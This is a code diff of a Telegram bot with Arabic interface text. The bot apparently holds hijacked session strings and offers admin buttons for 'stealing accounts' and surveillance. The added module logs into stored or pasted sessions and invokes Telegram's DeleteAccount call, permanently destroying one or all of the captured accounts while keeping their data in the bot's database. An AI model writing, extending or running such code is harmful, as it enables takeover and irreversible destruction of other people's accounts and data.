@@ -715,9 +715,17 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
         return False
 
-# =========================================================
-# 🎛️ واجهات التحكم
-# =========================================================
+
+
+
+
+
+
+
+
+
+
+
 
 def home_keyboard(uid):
     markup = InlineKeyboardMarkup()
@@ -732,8 +740,28 @@ def home_keyboard(uid):
     if uid in ADMIN_IDS:
         markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
         markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"), InlineKeyboardButton("• إدارة المراقبة ⏳", callback_data="manage_surveillance"))
+        markup.row(InlineKeyboardButton("• تـدمـيـر وحـذف الـحـسـابـات 🔴", callback_data="admin_destroy_accounts"))
 
     return markup
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 def accounts_action_keyboard(owner_id, action):
     accounts = get_all_accounts(owner_id)
@@ -1764,6 +1792,182 @@ def manage_surveillance_menu(call):
     if call.from_user.id not in ADMIN_IDS: return
     # تم إلغاء نظام المراقبة، لذلك سيظهر تنبيه منبثق للمستخدم
     bot.answer_callback_query(call.id, "✅ تم إلغاء نظام المراقبة نهائياً. السحب الآن فوري ومباشر ولن يتم تعليق أي حساب!", show_alert=True)
+
+# =========================================================
+# 🔴 وحدة حذف وتدمير الحسابات نهائياً من تلجرام (خاص بالآدمن)
+# =========================================================
+
+# قاموس مؤقت لتتبع انتظار إرسال كود الجلسة للآدمن
+admin_delete_state = {}
+
+def get_admin_delete_markup():
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("📥 تدمير حساب عبر كود الجلسة", callback_data="del_send_sess"))
+    markup.row(InlineKeyboardButton("📋 اختيار من الحسابات المخزنة", callback_data="del_list_stored"))
+    markup.row(InlineKeyboardButton("⚠️ تدمير كـافـة الحسابات المخزنة", callback_data="del_confirm_all"))
+    markup.row(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_home"))
+    return markup
+
+async def delete_telegram_account_raw(session_str):
+    """
+    يتصل بالجلسة المحددة عبر الذاكرة وينفذ استدعاء الحذف النهائي من تلجرام
+    """
+    client = None
+    try:
+        client = Client(
+            name=f"del_{int(time.time())}", 
+            session_string=session_str, 
+            api_id=API_ID, 
+            api_hash=API_HASH, 
+            in_memory=True
+        )
+        await client.connect()
+        # تنفيذ استدعاء التدمير والحذف النهائي لشركة تلجرام
+        await client.invoke(functions.account.DeleteAccount(reason="Decline ToS / Self-destruction"))
+        await client.disconnect()
+        return True, "تم حذف وتدمير الحساب بنجاح من سيرفرات تلجرام نهائياً! 🔥"
+    except Exception as e:
+        if client and client.is_connected:
+            await client.disconnect()
+        err_msg = traceback.format_exc()
+        print(f"❌ فشل عملية حذف الحساب:\n{err_msg}")
+        return False, str(e)
+
+# 📡 مستمع الأزرار والتحكم للآدمن
+@bot.callback_query_handler(func=lambda call: call.data.startswith("del_") or call.data.startswith("act_del_") or call.data == "admin_destroy_accounts")
+def admin_delete_callbacks(call):
+    if call.from_user.id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ غير مصرح لك باستخدام هذه اللوحة.", show_alert=True)
+        return
+
+    data = call.data
+
+    if data == "admin_destroy_accounts" or data == "del_back_main":
+        bot.edit_message_text(
+            "⚙️ **لوحة تدمير وحذف الحسابات نهائياً من تلجرام (المطورين):**\n\n"
+            "تنبيه: العمليات هنا نهائية وتقوم بحذف الحساب من تلجرام بشكل كامل ومباشر عبر الـ Raw API.\n\n"
+            "⚠️ (ملاحظة: البوت لن يقوم بحذف البيانات من قاعدة البيانات تلقائياً، يمكنك إزالتها لاحقاً بنفسك من خيار 'إزالة من البوت')",
+            call.message.chat.id,
+            call.message.message_id,
+            reply_markup=get_admin_delete_markup()
+        )
+        bot.answer_callback_query(call.id)
+
+    elif data == "del_send_sess":
+        admin_delete_state[call.from_user.id] = "waiting_for_session"
+        bot.edit_message_text(
+            "📥 **يرجى إرسال كود الجلسة (Session String) المراد تدميره الآن:**\n\nقم بنسخ وإرسال الجلسة في رسالة قادمة.",
+            call.message.chat.id,
+            call.message.message_id,
+            reply_markup=InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 إلغاء وتراجع", callback_data="del_back_main"))
+        )
+        bot.answer_callback_query(call.id)
+
+    elif data == "del_list_stored":
+        accounts = get_all_accounts(call.from_user.id)
+        if not accounts:
+            bot.answer_callback_query(call.id, "❌ لم يتم العثور على أي حسابات مسجلة بالبوت.", show_alert=True)
+            return
+        
+        markup = InlineKeyboardMarkup()
+        for acc in accounts[:40]: # عرض 40 حساب لتجنب تخطي حجم الرسالة
+            # acc[0] هو الـ id، و acc[1] هو الرقم، و acc[2] هو الاسم المجموع من دالة get_all_accounts
+            markup.row(InlineKeyboardButton(f"👤 {acc[2]} | {acc[1]}", callback_data=f"act_del_one:{acc[0]}"))
+        
+        markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="del_back_main"))
+        bot.edit_message_text(
+            "📋 **الحسابات النشطة بالبوت:**\n\nاختر الحساب الذي تريد تدميره من تلجرام فوراً وبدون تراجع:",
+            call.message.chat.id,
+            call.message.message_id,
+            reply_markup=markup
+        )
+        bot.answer_callback_query(call.id)
+
+    elif data == "del_confirm_all":
+        markup = InlineKeyboardMarkup()
+        markup.row(InlineKeyboardButton("🔥 نعم، تدمير وحذف كافة الحسابات!", callback_data="act_del_all_now"))
+        markup.row(InlineKeyboardButton("🔙 إلغاء وتراجع", callback_data="del_back_main"))
+        bot.edit_message_text(
+            "⚠️ **تـنـبـيـه كـارثـي:**\n\nأنت على وشك تدمير وحذف **جميع الحسابات المخزنة في البوت** نهائياً من تلجرام!\n\nهل أنت متأكد تماماً وتريد المتابعة؟",
+            call.message.chat.id,
+            call.message.message_id,
+            reply_markup=markup
+        )
+        bot.answer_callback_query(call.id)
+
+    elif data.startswith("act_del_one:"):
+        acc_id = int(data.split(":")[1])
+        acc = get_account(acc_id)
+        if not acc:
+            bot.answer_callback_query(call.id, "❌ لم يتم العثور على الجلسة المحددة.", show_alert=True)
+            return
+        
+        # وفقاً لدالة get_account في كودك:
+        # acc[2] هو الهاتف، acc[4] هو الاسم، acc[5] هو pyro_session
+        phone = acc[2]
+        name = acc[4]
+        pyro_sess = acc[5]
+        
+        bot.edit_message_text(f"⏳ جاري تدمير وحذف الحساب `{name}` | `{phone}` نهائياً من تلجرام...", call.message.chat.id, call.message.message_id)
+        
+        success, res_msg = run_async(delete_telegram_account_raw(pyro_sess))
+        if success:
+            bot.edit_message_text(
+                f"✅ **تم حذف الحساب `{name}` نهائياً من تلجرام.**\n\n⚠️ تم ترك بياناته بالبوت لتقوم بإزالتها يدوياً لاحقاً.",
+                call.message.chat.id,
+                call.message.message_id,
+                reply_markup=get_admin_delete_markup()
+            )
+        else:
+            bot.edit_message_text(f"❌ فشل حذف الحساب بسبب:\n`{res_msg}`", call.message.chat.id, call.message.message_id, reply_markup=get_admin_delete_markup())
+        bot.answer_callback_query(call.id)
+
+    elif data == "act_del_all_now":
+        accounts = get_all_accounts(call.from_user.id)
+        if not accounts:
+            bot.edit_message_text("❌ قاعدة البيانات فارغة بالفعل.", call.message.chat.id, call.message.message_id, reply_markup=get_admin_delete_markup())
+            return
+        
+        bot.edit_message_text(f"⏳ جاري بدء تدمير {len(accounts)} حساب دفعة واحدة من تلجرام...", call.message.chat.id, call.message.message_id)
+        
+        deleted_count = 0
+        failed_count = 0
+        for acc in accounts:
+            # acc[4] في get_all_accounts يحتوي على pyro_session
+            success, _ = run_async(delete_telegram_account_raw(acc[4]))
+            if success:
+                deleted_count += 1
+            else:
+                failed_count += 1
+                
+        bot.edit_message_text(
+            f"📊 **تقرير الحذف النهائي للـ Raw API:**\n\n"
+            f"🔥 حسابات مدمرة بنجاح: {deleted_count}\n"
+            f"❌ حسابات تعذر حذفها: {failed_count}\n\n"
+            f"⚠️ يمكنك الآن إزالتهم من قاعدة بيانات البوت بنفسك.",
+            call.message.chat.id,
+            call.message.message_id,
+            reply_markup=get_admin_delete_markup()
+        )
+        bot.answer_callback_query(call.id)
+
+# 📨 مستمع استلام نصوص الجلسات المرسلة يدوياً
+@bot.message_handler(func=lambda msg: admin_delete_state.get(msg.from_user.id) == "waiting_for_session")
+def handle_session_destruction(message):
+    admin_delete_state.pop(message.from_user.id, None)
+    session_str = message.text.strip()
+    
+    if not (session_str.startswith("B") and len(session_str) > 100):
+        bot.reply_to(message, "❌ النص المرسل غير مطابق للجلسات المدعومة.", reply_markup=get_admin_delete_markup())
+        return
+        
+    status_msg = bot.reply_to(message, "⏳ جاري تدمير الجلسة من سيرفرات تلجرام...")
+    
+    success, res_msg = run_async(delete_telegram_account_raw(session_str))
+    if success:
+        bot.edit_message_text(f"✅ **تم حذف وتدمير الحساب نهائياً!**\n\n{res_msg}", message.chat.id, status_msg.message_id, reply_markup=get_admin_delete_markup())
+    else:
+        bot.edit_message_text(f"❌ **فشلت العملية:**\n\n`{res_msg}`", message.chat.id, status_msg.message_id, reply_markup=get_admin_delete_markup())
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("unsurveil:"))
 def execute_unsurveil(call):
